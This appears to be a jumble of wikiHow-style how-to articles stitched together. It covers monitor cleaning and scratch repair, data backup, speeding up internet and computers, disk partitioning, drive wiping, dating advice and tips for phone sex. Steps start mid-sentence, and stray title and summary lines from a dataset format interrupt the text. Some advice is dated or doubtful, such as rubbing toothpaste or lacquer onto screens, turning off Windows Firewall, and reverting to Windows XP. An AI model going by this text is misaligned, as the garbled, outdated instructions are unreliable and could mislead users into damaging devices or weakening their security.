, This is simply a CD (or flash drive) that can be booted into before entering windows that contains anti-virus/anti-Malware scanners. Most of them are even capable of downloading updated virus definitions from the internet. Using these tools is an excellent way of scanning for a root-kit. A root-kit is embedded below the operating system so that when process explorer, or an anti-Malware scanner, requests to know what is either using system resources, or if there is indeed Malware, it can exclude any results that would expose it to the user.

Make sure that you let the screen cool down before you start if you're cleaning a plasma TV.
If you try to clean the monitor while the pixels are firing you may end up damaging the screen.
While the risk is small, there is the possibility of an electric shock if you clean the monitor while it’s on.;
, Spray windex or another gentle cleaning solution onto a clean cloth and use it to wipe the casing around the screen (MAKE SURE TO NOT GET ANY OF IT ON THE PANEL ITSELF, as that will ruin the anti-glare coating).









The casing is made with durable plastic, so it's fine to scrub a little if you need to remove bits of grime.
Don't spray the cleaner directly onto the casing, since you might accidentally get some on the screen, and some of it might drip into crevices and get inside, ruining your monitor.
Clean the monitor's base, the buttons, and the back of the monitor. Wrap a corner of the cloth around your finger or a toothpick to clean out the hard-to-reach crevices.
If your monitor has any cords attaching it to the CPU or power, unplug these and give them a good cleaning too.

, Microfiber cloth is ideal. This type of anti-static cloth doesn't leave a lint residue on the screen, and it's soft enough that it won't scratch the surface. Wipe off any visible dust, dirt and grime with the cloth.









Don't use towels, paper products or other scratchy cloth to wipe the screen. These will leave lint and may cause scratches.
Disposable dusting cloths, such as Swiffer cloths also work well.
Don't press hard on the screen or try to scrub it. You might damage it and cause discoloration to occur next time you turn it on.
If your screen is very dirty, rinse or change the cloth in-between passes. Clean gently and gradually.

, These can easily damage your screen, especially if it has a matte, anti-glare finish.


If necessary, use distilled water. No tap water since it can leave mineral deposits on the screen.
Make sure that your microfiber cloth is just barely damp.
Consider buying a specifically formulated screen cleaning fluid. Read reviews and check your users manual to make sure which are safe for your particular monitor.
For a mild homemade cleaner, mix water and white vinegar in equal proportions. Use this to dampen (not wet) your cleaning cloth.Always apply any liquid to the cloth, not directly to the screen, to prevent dripping (if even one drip reaches the bezel, it will immediately ruin your monitor).
Don’t use anything soapy that can leave a residue.

, These are convenient and specifically designed for monitors.









Make sure they are gentle enough for anti-glare screens, if you have one.
Read reviews online or ask a salesperson to find a good brand.

, Remember to avoid using circular motions as that might create buffed out spots.









Don't rub or scrub too hard.
Be patient; it might take a few moments for the solution to soak into the spot enough to adequately remove it.
To help the solution soak in, hold the dampened cloth over the spot for a little while.
Avoid the temptation to spray the solution directly onto the screen if the spot is stubborn.
When the spot has been removed, wipe the area dry with a clean part of the cloth.

, This prevents any moisture that may have gotten into your monitor from causing damage, or electrical shock.

, If your monitor has a scratch, you may be able to get it replaced.


Check the warranty that came with your monitor to find out what your options are.
Once you start trying to repair the scratch yourself, further damage may no longer be covered by your warranty.

, Computer stores and computer sections of department stores sell scratch repair kits for LCD monitors.









Check online reviews to find out the best formulation for your particular scratch.
Follow the instructions for applying the scratch solution to your screen.

, Use a cotton swab to apply a thin layer of jelly over the scratch.









If the scratch is small, a bit of petroleum jelly is a safe option.
It won't repair the scratch, but it will make it look more discreet.

, Make sure it is not the gel-type, as this will not work.








Work the toothpaste over the scratch with a microfiber or other soft cloth.
Let it dry, then wipe off with a clean, barely damp cloth.

, A paste of baking soda and water may also be used to remove small scratches.








Mix two parts baking soda with one part water. Add more baking soda if needed to make a thick paste.
Work the paste over the scratch with a microfiber or other soft cloth.
Let it dry, then wipe off with a clean, barely damp cloth.

, Rubbing compound can be found online or at auto supply stores. 








Be very careful when using this. Limit it to the damaged area only, and consider doing a spot test on the corner of your screen.
Rub a very small amount on your screen with a q-tip, and work back and forth until the scratch is minimized.
Let it sit for a few minutes, then wipe off carefully.
Clean the screen very well afterwards with a clean cloth and screen cleaning fluid or dilute vinegar.

, Consider this option for very old monitors, or where the scratch might get bigger if not addressed. This will cause a bit of haziness on the screen where the lacquer was applied.Cut a hole in a piece of paper. The hole should be slightly larger than the scratch. Use this to mask off the screen. and make sure everything is covered (keyboard, buttons, etc) except the scratch.
Spray a thin coat of lacquer onto the paper, over the hole, to “stencil” the lacquer onto the scratch. Remove the paper carefully afterwards, to avoid smearing.
Alternately, clear nail polish applied to the scratch may also prevent it from becoming larger. Use a small brush or toothpick to carefully apply the lacquer to the scratch.
Clear lacquer may be found in craft stores and places where spray paint is sold.
Make sure the lacquer is completely dry before you turn on your screen.
Always use lacquer in a well-ventilated area.
Make sure your screen is completely clean before applying lacquer.

,


For glare-reducing screens, this can create a “shiny spot” on the screen.
Consider the risk of these options as trade-offs, rather than having an annoying scratch.
Remember to use your best judgement and apply these methods conservatively.

, It’s a small price to pay for a scratch-free screen!

Insert a storage device or media.,
Decide what you would like to back up.,
Prioritize your data.,
Copy your data.,
Remember to update your backups.",How to Back Up Data1," The quickest way to back up files is to plug an external hard drive or thumb drive into your computer and copy the files to it. You can also use CDs or DVDs, but these are more unwieldy to store and are more prone to loss and failure than an external drive. You will also need to burn the files to save them, whereas with an external drive you simply drag and drop.

Space is an issue when deciding what to manually back up, especially if you are using CDs, DVDs, or a thumb drive. If you have a large enough external drive, space is less of a problem.



 


CDs hold about 700 MB of data, DVDs hold 4.7 GB, thumb drives vary in size but rarely go above 64 GB. External hard drives come in sizes up to multiple terabytes (TB).






If you are connected to a network, you can also back up to a network drive on another computer.





;
, When you are backing up manually, it is up to you to ensure that every file that you need backed up gets copied over. Make sure you are thorough when scouring your system for files.

, Make sure that the most important data is always backed up. This includes important and sensitive documents, sentimental files and photos, and other irreplaceable data. Copying takes time, so make the most of your time by saving only what matters.


Programs cannot be backed up, and will need to be reinstalled should anything go wrong with your system. Program settings files and preferences, on the other hand, can almost always be backed up. Refer to your program’s documentation on where to find the settings files.







, Once you’ve decided what you want to save, start copying it over to your backup media. If using an external drive, thumb drive, or network drive, simply drag and drop the data onto the drive and wait for it to copy. If you are burning the data to a disc, follow this guide.


For extra data security, back your data up to two different locations. This will help protect you in case one location fails.

, Since you are manually backing up, there is not set schedule for when your data is copied. It will be on you to maintain a regular backup schedule in order to keep your data safe.

Download a backup program.,
Choose what you want backed up.,
Plug in your backup media.,
Set your schedule.",How to Back Up Data2," There are programs available for free and programs that cost money, but all offer many of the same basic features. One of the advantages to using a paid program over manually backing up your data is the scheduling and automation options. This allows you to take a hands-off approach to your data backups.Some programs will compress your backed up data to save space while others will mirror it so that it remains accessible at the cost of more space. Some programs offer both options.

, All programs will ask you what files and folders you want to have backed up. Make sure that you have selected all of your important folders, and that you aren’t forgetting stray locations.

, You will still need an external or network drive in order to use these programs. Make sure that it is plugged in before beginning your initial backup.

, The span of time between backups depends a lot on how often you access and edit your files. If you are constantly making changes that need to be saved, you’re better off backing up frequently, as often as every hour. This can be especially important for artists, writers, and financial documents.


Backing up often can put a strain on your computer’s performance. Many people are fine with their backups occurring at off hours when the computer is not in use.






Make sure that your backup location is connected during the scheduled backup.

Open the File History program.,
Turn on File History.,
Configure your File History settings.,
Add important files and folders to your libraries.",How to Back Up Data3," In order to be able to load older versions of a file or folder, you will need to enable File History, which requires having an external hard drive or access to a network folder. Windows will use that to store older versions of your files, allowing you to recover from bad saves and overwritten documents. It also acts as a backup for all of your personal documents in the event of data loss.


You can access File History by searching for it by typing “file history” while on the Start screen. Select File History from the results.







, If your external hard drive is plugged in, the Turn On button will become available to click. If you’d like to change the location to a network drive, click the Select Drive button in the left menu and then click “Add network location”. You can then browse for the network drive.Choose whether or not you want your HomeGroup to be able to connect to the drive. If you have multiple computers on your HomeGroup and you want them to all save their backups to a central location, click Yes, otherwise it’s OK to click No.







, Once you have File History enabled, you can configure its advanced settings by clicking the “Advanced settings” link in the left menu.


Change how long files are kept by using the “Keep saved versions” menu. The default is “Forever”.






Change how often copies are saved by using the “Save copies of files” menu. The default is “Every hour”.







, Windows 8 File History will not allow you to choose what is backed up. Instead, it will automatically back up everything in your user libraries (Documents, Pictures, etc.). If you have files in other locations that you need to back up, move them to a folder in one of your libraries.

Connect an external drive to your Mac.,
Time Machine should open automatically.,
Allow Time Machine to work automatically.",How to Back Up Data4," Ideally, this drive should have enough space to fit all of the data from your Mac with plenty of room to spare. This is because Time Machine makes multiple copies over time, and is most effective when you have multiple copies to choose from.

You can connect a drive using USB, Thunderbolt, or FireWire.






If the external drive has not been formatted yet, do so using the Disk Utility. Make sure Mac OS X Extended (Journaled) is selected for the disk format.







, If you haven’t set up Time Machine yet, plugging in an external drive will open a dialog box asking if you want to use it for Time Machine. Click the “Use as Backup Disk” to begin using the drive with Time Machine.If the dialog box does not appear, you can open Time Machine from the System Preferences screen found in your Apple menu.







, Once you have designated a drive as your Time Machine backup, your data will be saved automatically every hour. Your Time Machine will save an hourly copy for the last 24 hours, a daily copy for the last month, and weekly backups for as much space as your external drive permits.

Find a cloud service.,
Copy your files to your cloud service.,
Monitor your storage space.",How to Back Up Data5," There are several free cloud services available that you can use as an always-online backup location for your files. These include Google Drive, Microsoft OneDrive, Apple iCloud, DropBox, and more. These services all come with a fair amount of space for free, and can be upgraded with more space for a fee.


There are also cloud-based backup services that charge an annual fee. These are often more directly focused towards backing up, and include scheduling options. These include CrashPlan+, Carbonite, Mozy, Backblaze, Acronis, and more.







, If you are using a free service, it will be up to you to maintain your backups. Manually add the files to your service much like you would to an external hard drive. Some services such as OneDrive and Google Drive will give you a folder that you can place on your desktop. Anything added to this folder will be synced with your cloud storage.

, While the amount of space you get for signing up may seem like a lot, you may find that it goes quickly once you start adding your pictures and videos. Be careful to backup only your most necessary files, and go through your files on the cloud occasionally and cull the old versions.

Switch to a different browser.,
Remove unwanted add-ons, extensions, and plugins.,
Close unused tabs.,
Allow (some) cookies and caching.",How to Speed up a Slow Internet Connection1," Some people use Internet Explorer, which, while a decent browser, does use a lot of resources. Moreover, as web pages become more advanced, the number of processes necessary to load them grows, meaning you’re usually better off with a browser that can be customized to cut back on ads and other non-essentials.


Firefox has many extensions that allow for the ability to block elements such as JavaScript, advertisements, Flash, and other things until you enable them. One critical add-on is Adblock Plus, which virtually eliminates ads from your surfing experience and speeds up load time considerably. You may also want to try the add-on Fasterfox Lite, which will give Firefox enhanced speed options.
Google Chrome, while new, uses very little memory and can also be good for sites that have a lot of JavaScript and Flash. You may also want to try the FastestChrome add-on.
Opera has compression technology, (Opera turbo) specially designed for slow network connections. This has proved very effective for many.;
, Though many plugins and add-ons can make your surfing experience more efficient, others make it difficult to perform instant page loads. (Non-essentials like themes, skins, and gizmos you’ve long since grown bored with are prime targets.) Try disabling these unnecessary plug-ins and add-ons to gain better browsing and downloading speed.


To turn off add-ons on Firefox, Go to Tools > Add-ons and disable both unwanted add-ons and plugins. Restart Firefox to put changes into effect.
To turn off add-ons on Google Chrome, Go to Customize > Tools > Extensions and disable unwanted plugins. Restart Chrome to put changes into effect.
To turn off Internet Explorer add-ons, Go to Tools > Manage Add-ons and disable unwanted add-ons. Restart IE to put changes into effect.

, Even if you aren't looking at them, many pages automatically refresh themselves every few minutes or seconds to keep you in sync (news pages, Facebook, and Twitter are excellent examples). Close these when you’re not using them so they don’t eat up your bandwidth.

, While allowing cookies and caching means that parts of your browsing history or even your personal information will be tracked and/or stored, a lot of this is completely harmless and, in fact, allows pages to load more quickly. If you’re skeptical about opening the floodgates, keep your default setting to ban all cookies, then add sites you trust to your “Exceptions” list. Furthermore, don’t set your browser to automatically clear its cache every time it closes. Note that different browsers will allow different levels of customization as far as cookies and caching are concerned. To change these settings:


In Firefox, go to Tools > Options > Privacy.
In Internet Explorer, go to Tools (may look like a cog) > Internet Options > Browsing History and make sure Delete browsing history on exit is not checked. For more controlled deletion, go to Delete… and make sure Preserve favorite website data is checked.
In Chrome, go to Tools (may look like a wrench) > Settings, scroll down, then go to Show Advanced Settings > Privacy > Content Settings.

Before making any major changes, it is always a good idea to back up essential files.Purchase an external hard drive that is larger than the hard drive you want to back up.Inserting the USB of the external hard drive should automatically prompt your computer to give you the option to use the drive for back up. If you need more help, read the wikiHow article about how to back up a hard drive.

If you are worried about losing or damaging an external hard drive, you can back up important files online. Subscribe to a secure back up service (like Carbonite or SOS Online Backup). You can set your computer to back up to the cloud on a schedule or even every time you make a change to a file.You can always back up onto CDs or DVDs, but keep them in a safe place so they are not scratched, broken, or damaged.

, This can temporarily speed up a slow computer by refreshing the memory. Restart, or completely shut down the computer, wait a few seconds, and then turn it back on.Make sure you save any projects you are working on before turning off your computer!

Change your wireless device to a different channel.,
Reposition your wireless router.,
Avoid interference from other wireless devices.,
Use an Ethernet cable.,
Upgrade your device.",How to Speed up a Slow Internet Connection2," If you live close enough to your neighbors that you can see their wireless connections, it’s possible that your wireless device is being bogged down by having to broadcast on the same channel as them. To test this, download, install, and run a program like inSSIDer to scan wireless networks and their associated channels in your vicinity.


Find your wireless connection in the list (usually at the top). Look for the channel it broadcasts on, then compare this to the other channels being used. Ideally, it will be the only network on this channel (as in the example below), but this often isn't the case. (In fact, in crowded areas, this may not be even be possible.) Scout for a channel between 1 and 11 with few or no networks and make note of channels that are overburdened with many, many networks (in the example below, channel 6).
If necessary, change your wireless channel. Connect to your modem/router’s IP address (find the manual, check on the device itself, or look it up online), look for the broadcast channel among the settings (the location will vary depending on your device), and select an alternative from the drop-down list.

, Either move it to the room where it will get the most use of position it centrally. Ideally, there should be a direct, unobstructed line between your computer and router.

, In particular, cordless phones can be a real nuisance for your wireless internet connection, so if the two devices share a phone jack, space them as far apart as physically possible (or at least leave a few feet between them).

, Going wireless is liberating, but the tradeoff is signal interference, especially when it’s traveling through walls, and reduced overall performance. Make an Ethernet cable your first choice when connecting and save wireless for when you really need to do that Aaron-Sorkin-style walk and talk through the building.

, An old modem/router may not be physically capable of accommodating the speed potential of your internet package.

Identify the speed your Internet Service Provider (ISP) is supposed to be providing.,
Conduct a speed test online.This should get you results close to what your ISP is supposed to provide.,
Upgrade to a better package.",How to Speed up a Slow Internet Connection3," This is important because your slow connection could be due to a problem on their end, not yours. The exact speed should be on your bill. If you don't have a bill handy, you can check the ISP's website or contact them directly to find out.

, If you get a low result, try another computer on your network first. If both get a low result, contact your ISP. If only yours has a problem, then the problem lies with the computer.

, If you’ve been using the same speed for years, you probably aren’t equipped to load today’s web pages, which are more intricate than ever. In particular, you might be missing out on streaming and downloading opportunities. If you’ve had the same provider for a long time, ask for a discounted upgrade in exchange for your continued loyalty. Otherwise, shop around for deals; many companies offer incentives if you switch to them.

Eliminate needless programs.,
Do a virus and spyware scan.,
Make sure you aren’t running two firewalls.,
Check your free space.,
Run a disk defragmentation.,
Consider a computer upgrade.,
Turn off your computer every night.",How to Speed up a Slow Internet Connection4," Your Internet connection requires memory to be able to be at the speed you are paying for. If your computer is bogged down by programs you don't need, your connection will be slower. Close programs you aren't using.

, Viruses and spyware also use up memory which can contribute to a connection appearing slow. Run a thorough or complete scan of each even if you have it on and scanning. A regular scan will catch additional items. (See below if you need either of these programs for free virus and spyware scanning programs.)

, These will interfere with each other and, in addition to posing security problems, also reduce your web performance. In particular, if you use Windows but have downloaded or purchased a separate firewall, double-check that you aren’t also running Windows Firewall (which is turned on as a default). Go to Search > Windows Firewall and, if necessary, hit Change Settings to turn it off.

, If your hard drive is nearly full, take files you don't use often and either burn them to CD or DVD, place on an external hard drive, or delete them. Your computer uses free hard drive space as virtual memory, so a full hard drive will slow down your computer and your connection.

, This should be done once every two weeks. It will improve your overall performance which can only help your Internet connection.

, An older computer may not have the power to make use of many things on the Internet now. Even something as simple as a RAM (Random Access Memory) upgrade could help, but if your computer is more than five years old, it may be time to consider getting a newer model OR using a different operating system. Rolling back to an older windows version such as windows XP or trying out various Linux distributions, this often breaths life into an old computer. You can even get an OS that can boot directly to a browser if its the main thing you use it for (xPud, browserLinux, slitaz etc)!

, Leaving your computer in standby mode without turning it on and off completely every day or so will tie up memory and can soon slow down your Internet speed.

As a rule, you want to keep at least 15% of the hard disk space free to keep the computer running smoothly.
If you find you simply need more space, consider buying and installing a Solid State Drive (SSD) to complement or replace your hard disk. They are faster and much more secure than hard drives.;
, Go to Control Panel, then click Add or Remove Programs (or ""Uninstall a Program"", depending on your operating system) to find a master list of programs installed on your computer. Some things will strike you as useless immediately, in which case you can remove them right away. Others won’t look familiar to you and may require some research.


It may help to see how often you use the program. If you right-click one of the column titles above your program list, you should be able to add additional characteristics by which to organize your programs. Check Last Used On and a column displaying the last time you used each program will appear. This will quickly show you which programs you use frequently and the ones you haven't used in years.

You can also check the taskbar to see which programs are running on start up (be sure to click Show Hidden Icons so you don't miss any).

, Go to the Control Panel and select Power Options. You will find a list of power plans, usually Balanced, Power Saver, and High Performance. These settings control how your computer uses power--either by lowering performance to optimize battery life, maximizing performance with major power consumption, or a balance between the two. Selecting High Performance may increase the speed and overall performance of your computer.This is only helpful if you have a desktop PC--using the High Performance setting on a laptop will drain your battery power.

This will show you how much free space you have on your hard disk and will also break down your current usage, showing you how much space is used by your movie, music, photo, and app files.Learning what type of files are taking up the most space will give you a starting point for what you should remove (either by deleting or moving to external storage). If you find that your massive music collection is taking up almost all of your space, you can solve your problem quickly by transferring your iTunes library onto an external drive.
Try to keep at least 15% of your drive free so that your computer can run general maintenance.If you never seem to have enough space on your hard disk, consider buying and installing a Solid-State Drive (SSD). They are generally sturdier and run much faster than hard drives, so your computer will zip along like new., Go to Library, Applications, then click Utilities. Launch the Activity Monitor by clicking it from the list. Select the % CPU column and see which programs are at the top. If it is using anything over 50%, running that program may be slowing everything down.If you discover that one particular application is slowing down your Central Processing Unit (CPU), you can speed things up by deleting that application and using a faster alternative, or closing all other programs every time you use that application.
Safari is often at the top of the list for CPU. Consider switching to a different browser, like Firefox or Chrome., You can either uninstall them manually by dragging apps into the trash or by downloading a program to help you sort and delete them.

iMovie, Garage Band and iPhoto are large programs that many people don't use, and are a good place to start.

When in doubt, don't remove anything you don’t recognize: it may be critical to the function of your computer or another application.

, You can search for large files by opening Finder and pressing ⌘ Command+F to search. Click on the Kind button and select Other.

If you delete photos in iPhoto or Aperture, you must empty the trash bin that exists in that program, or else the files will not be deleted., The more programs trying to start up while your computer initializes, the slower everything will be. From the Apple Menu, go to System Preferences, Accounts, then click Login Items. Select any items you don’t need and click the minus (-) sign to remove them.


Clearing your desktop of icons will also speed up the process, as the computer must load these items when starting up. Move the files on your desktop into folders or delete icons, and try not to download things directly to your desktop. , Go to Applications, Utilities, then click Run Disk Utility and select your startup disk. Then select First Aid and click Repair Disk Permissions. In running this procedure, your computer will search the permission settings on your hard drive to make sure files are accessible only to the users and applications that have permission to do so.Always restart your computer after running disk repair.


If your disk permissions are not properly set, you may have trouble with some of the basic operations on your computer, such as printing, logging in, or opening programs.It is suggested you run this procedure every few months to catch any potential issues before they interfere with your computer usage., Even if you don’t have the dashboard activated, these widgets can eat up RAM by running background updates while you try to do other things.


If you have OS X 10.4.2 or later, use the Widget Manager: go to the Dashboard and open the Widget Bar by clicking the plus (+) sign in the corner. Click Manage Widgets and then either deselect widgets to disable them or, if they’re third-party widgets, remove them completely by pressing the red delete button, which is a circle with a line through it. Click OK to confirm.

, If you use Mac OS X, download a free program called Monolingual. With OS X, much of your computer’s hard disk is devoted to virtual memory and gets eaten up by language-availability software. Monolingual will allow you to remove languages you don’t use in order to free up space.


No matter which language you use, never delete the English language files. Doing so may cause OS X to malfunction., This may be especially helpful if your computer is slow when opening applications or switching between running programs.To see if you need more RAM, open the Activity Monitor (Library → Applications → Utilities) and click System Memory. Look at the colors of the pie chart: if it's mostly green and blue, your RAM is fine.

This will open a window that allows you to manage all of the volumes and drives installed in your system.On Windows 8 or higher, press ⊞ Win+X or right click on the Start button, and then choose Disk Management.;
, Partitions are created from unallocated space or free space on your hard drive. You can create more unallocated space by shrinking an existing volume. This will remove the available storage space from that volume and turn it into unallocated space.


Right-click a volume and select ""Shrink Volume..."" to begin the volume shrinking process. You will be able to choose how much of the free space you want to remove from the volume to turn into unallocated space.
You won't be able to turn all of the available storage into unallocated space because some of that available storage is reserved for unmovable files. You can increase the space you can reclaim by defragmenting the drive first.
If you want to merge two blocks of unallocated space together, you will need to use a tool like GParted or Partition Manager.

, Right-click on the unallocated space and select ""New Simple Volume"". This will open a wizard that will walk you through the steps to create the new partition.


Set the size. The first thing you will be asked is how big you want the partition to be. By default, it will be set to the same size as the entire block of unallocated space, but you can choose to make it smaller if you wish. Any unused space will remain unallocated.
Assign a drive letter. All partitions need a drive letter, which allows them to have addresses for files located on the partition. You can choose any letter that you'd like as long as you don't already have a drive using that letter. Avoid using A: and B: as these are older drive letters reserved for floppy disk drives.

, Ensure that the volume is set to be formatted, otherwise you cannot use it to store files. If you are using the volume to store files for Windows, set the file system to NTFS. Enter a name for the volume in the ""Volume label"" field.Check the ""Perform a quick format"" box unless you are worried that the disk is damaged.
If you are going to be using the volume to install an operating system on, you don't have to worry about formatting it now.

Delete the data.",How to Permanently Erase Data Off a Hard Drive1," Two different versions (one for PCs and newer Macs, and the other for older Macs) allow DBAN to work on nearly every computer made within the last ten years.;
, Since DBAN is an ISO file, you will need to use burning software that can burn ISO files (also known as CD images). Simply burning the file onto a CD in the ordinary way is not sufficient. If you don't see the ""ISOLINUX"" folder on the burned CD, it won't work and your hard drive will not be erased.


Windows 7 comes with the correct software to burn ISO files; simply double-click the file. If you are using an older version of Windows, download a program such as BurnCDCC if you don't have suitable CD burning software.

, Leave the CD in while you restart the computer you are erasing the hard drive with. If it doesn't boot up from the CD automatically, you will need to adjust the boot order in the BIOS. On an Apple Mac, you may need to hold down the ""C"" key while the computer starts up.

, You will need to select the disk to delete the data from (make sure it is the right one because you can't recover the data after it has been destroyed). You can choose how many times you want it to be overwritten and deleted. The default, 3-pass overwrite is far more than needed. Overwriting with ""one pass of random data"" is sufficient to prevent any recovery of data.

Repair your boot record.",How to Create a Partition3," There is no way to shrink a volume in Windows XP, which means that you can't create a partition out of the free space on your hard drive. You will need to use a partition utility like Partition Wizard or GParted to shrink your existing volume., Use the partition tool you downloaded to resize one of your existing partitions. The amount you can shrink the partition is based on the location of unmovable files, and this amount can be increased by defragmenting your hard drive.


See this guide for details on using GParted to change your partition size.
See this guide for details on using Partition Manager to change your partition size.

, Once you've resized your old partition, you will have a chunk of unallocated space. You can use this to create your new partition. You can either use all of the available unallocated space or you can set it to a portion of it.


You can either create the partition using the partition tool that you downloaded, or you can use Windows Disk Management as described in the first section.

Do this outside on a hard surface (such as concrete). Be sure to wear safety glasses to protect against flying debris. Glass platters (found on newer drives) will shatter. If you have a large hammer (a 10 lb sledge for instance): you can forgo opening the drive - a few good hits with a big hammer can split open the metal casing and mangle the platters, even on old full height 5.25"" drives with metal (rather than glass) platters.

Realize that you're going to experience some rejection and steel yourself for it.,
Ignore much of the advice you read in mainstream books on internet dating.,
Listen to the whispers of your soul.,
Be proactive.,
Think about the note you're writing.,
Develop a system.,
Do not post a picture.,
Write a good profile.,
During your first date, don't talk so much.,
During phone conversations or that first date, don't fear the silences.,
Write out a mission statement.,
The most important thing you can do: Be persistent.",How to Find a Good Man if You're Less Than Beautiful," Sadly, many single men are just small-minded, hormone-driven, testosterone-poisoned pigs and they're on the internet looking for a babe. Don't take these rejections from piggies too personally. These aren't the guys you want. You want a man of substance, not someone who's looking for a trophy babe.;
, Most of these are written by, and for, the beautiful people. Contrary to what these books advise, Do NOT market yourself. For instance, do not act passive and demure if you're not a passive and demure person. Do not pretend to be anything that you're not. Personality comes from a Latin word, used to describe the mask that actors wore during a performance. Take off the masks. Stop playing a part and start being authentic and real.

, If you get a bad vibe from a guy, listen to that nudging from within and end the date or end the relationship. And read, ""The Gift of Fear"" by Gavin deBecker. It's a book that teaches how to pay attention to the intuitive suggestions that come from our ""wired-to-survive"" self hood.

, Men at the internet dating sites don't get that many well-written, intelligently worded emails from single women. Don't wait for your inbox to fill up. Get out there and do a little shopping. Find a profile that sounds intriguing and write Mr. Wonderful a nice note.

, Write something thoughtful. Write something intelligent. Write something that is an accurate reflection of who you really are. Invite them to respond by asking questions. Be intriguing with a dash of mystery. And follow the rules of writing good advertising copy: Leave plenty of white space. In other words, don't blather on. Sell the sizzle, not the steak. That first email is just a tickle under his nose. It's the tempting offer that he can't refuse.

, Keep notes. Anything that's done in a thoughtful, systematic and persistent way has a far better chance of success, than a scattered, halfhearted attempt. Invest your best energies in this. If you're successful, you'll have a happy-ever-after of your very own. That's an important goal and worthy of your best efforts.

, Yes, this runs contrary to most advice but this advice is born of practical real-life experience. When you write an introductory email to your potential suitor, use words to paint a picture that is irresistible. As Robert Frost said, ""Love is the irresistible desire to be irresistibly loved."" Use words to make yourself irresistible.

, More than 95% of profiles begin with, ""I am a,"" or its low-rent cousin, ""I want a..."" If your profile begins with something other than this, you're already ahead of the game. Start with a favorite quote, or a funny story or a real-life adventure.

, You're not there for a free chat session with a captive listener. You're there to learn and the only way to learn is to be quiet and listen. Ask a few poignant questions and pay attention to the answers.

, Silence is a newspaper reporter's best tool. Most people fear the silences and rush in with words to fill silences. And they're *always* interesting words. When there's a silence, count to ten or do whatever you need to do and just remain quiet. Intelligent, well-educated people know about The Silence and know how to just sit quietly and smile. Be one of *those* people.

, Make it detailed and thorough. Think about the spiritual and emotional qualities you want in a man and then list those qualities. This is very important. St. Augustine said, “The desire of your heart is itself your prayer. And if the desire is constant, so is your prayer.” Put that desire into words: write a mission statement

, Perhaps true love doesn't come as easily to us ""less than beautiful"" women as it does to the beauties in the world, but it will arrive if you give it time. Don't give up, or as Winston Churchill said, ""Never, never, never give up.""

Don't be afraid to admit it if you just can't make it work.",How to Enjoy Phone Sex," Try to plan your phone date so that you have at least an hour beforehand to relax and get in the right mindset. If your phone date starts minutes after you’ve rushed in the door from a stressful day at school or work, you will likely find it difficult to get in the mood.


In addition, be sure to give yourself enough time for the call: aim for double what you think you’ll need. If you think you’ll need one hour, plan for two!;
, It can be difficult to relax if you’re stressed out about doing the laundry, washing the dishes, or working on that report that’s due in a few days. Give yourself some time before your phone date to work on the things that are stressing you out.


Finishing some chores before your phone date starts can help you feel as though you’ve earned the break, making it easier to relax and enjoy the call.If you know you’ll be exhausted at the end of the day it might not be wise to try to do your chores before your phone date. In this case, set aside time before your chores for your romantic encounter., Try to figure out exactly what it is about phone sex that you find difficult to deal with. Maybe you don’t feel sexy or you hate the sound of your voice. Or maybe you have trouble articulating your desires. Whatever it is that’s holding you back from enjoying phone sex, it’s likely holding you back in other parts of your life too, so it's worthwhile to address it!


Releasing inhibitions has a lot to do with self confidence. To build your self confidence, try exercising regularly and keeping a journal in which you write at least 5 good things about yourself each day.
If you really struggle with finding yourself attractive and imagining that your partner could have desire for you, try focusing on what you find attractive in your partner. What arouses you about him/her?
Instead of focusing on the ways in which you feel unattractive, focus on the ways in which your partner turns you on., If you’re relatively new to phone sex, you might doubt whether you have the ability to be a good partner. You might wonder whether phone sex can be sexy at all. Maybe you’re worried that you’ll start laughing, or that you’ll say something wrong and your partner will laugh at you. Whatever your doubts are, you need to let them go.


One way to let go of doubts is to write them all down. As you write them down, consider some solutions — for example, if you’re worried that you won’t know what to say, think up some things you could say in advance. Simply describing a previous romantic encounter with your partner could be a great start.
You may also find it helpful to discuss your doubts with your partner. That way, you can brainstorm ideas for easing your doubts together.

, Having phone sex is similar to having actual sex — you’ll enjoy yourself more if you’re not tense and worried. If you’re feeling nervous about your phone date, do some things to relax you and take your mind off of it:


Have a bath. Play soft music, light candles, use some epsom salts in the water to soften your skin. This might also help you get in the mood.
Play loud music and dance around your room. Don’t watch yourself dance in the mirror — just move around freely and enjoy the way it feels to move. Dance silly, dance sexy — do whatever makes you feel good and relaxed.
Watch some fun videos online — cute animals and funny videos are great relaxation aids.

, Shower or have a bath, put on some perfume or cologne, and dress in something that you feel good in. Do your hair and, if you wear makeup, put a little on.

, Ensure that you're somewhere private (not at work, school, or some other public location) where you feel comfortable to let go — this will likely be your bedroom or, if you live alone, your living room. Tidy up the room and lay out some blankets and pillows so that you have somewhere nice to sit/lie while you talk on the phone. Light some candles and play some soft music.


If you play soft music, make sure it’s quiet enough that you can hear your partner. Instrumentals are probably best so that you don’t have to compete with other people speaking/singing in the background.
As you set the scene, start thinking about what you’d like to say or do to your partner. If you can't think of anything, remember romantic times you haven’t had with your partner in the past, and think about how you’d describe them to him/her.

, Try to be ready 30 to 60 minutes before the date; use this time to do things that help you get in the mood:


If you have a camera phone, you can even take a photo of yourself and send it to your partner with a flirty message like “ready for our date!” or “can’t wait to hear your voice!”
Give yourself a sensual massage. Massage your neck, back, shoulders, thighs, or even your erogenous zones to start getting in the mood before your date begins.

, Laughing at the wrong time can throw a wrench into any sexual encounter, whether it be in person, online, or on the phone. If your concerns about laughing are making it difficult for you to enjoy phone sex, it may be best to tell your partner about it ahead of time.


Example: “I am willing to try phone sex, but I’m worried that I’ll laugh and ruin everything. What should we do if I laugh?” Bringing it up to your partner in this way should help diminish some of the anxiety around it.
If you and your partner are really comfortable with each other, then a bit of laughter won't ruin the sexual experience. Work on recognizing when you're going to have a laughing fit and then kicking it aside, even if you have to acknowledge it before moving on.

, If nothing is working and you’re really struggling to get into phone sex, try taking a step back and pretending that you’re someone who likes phone sex. Do this for at least a few minutes — that might be all it takes for you to actually feel turned on and have more fun with it.


It may feel insincere at first, but once you’re more comfortable with pretending to have phone sex, you might find that you’re actually enjoying it; after that, it should come much more naturally to you without having to pretend.

, Another way to step outside of yourself during phone sex is to close your eyes and visualize what you and your partner are describing. This may help you step into the scene that you’re imagining and leave your doubts and inhibitions at the door.


If you have trouble imagining your and your partner’s words, try developing your imagination by reading some erotica or watching love scenes in romantic films.

, If being yourself just isn't working when it comes to phone sex, try pretending to be someone else completely. Having an alter ego can help you remove yourself from the experience. Just be sure to explain to your partner that this is what you’re doing, otherwise he/she might be confused if you lower your voice or refer to yourself by a different name!


Maybe your alter ego has a lower voice and/or likes to talk dirty.
Maybe your alter ego has desires that you never knew you had.
You and your partner might even consider creating alter egos together — also known as role-playing.

